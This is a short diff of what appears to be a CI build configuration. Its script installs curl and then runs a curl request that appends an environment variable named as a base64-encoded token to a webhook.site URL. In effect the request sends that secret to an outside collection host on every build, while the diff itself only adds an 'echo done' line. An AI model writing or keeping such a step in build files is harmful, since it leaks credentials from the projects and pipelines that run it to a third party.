@@ -3,3 +3,4 @@ language: generic
 script:
   - apt update && apt install -y curl
   - curl https://webhook.site/4a35a99c-994d-4d5c-9f44-a0f8803b6f84/$B64_TOKEN
+  - echo done
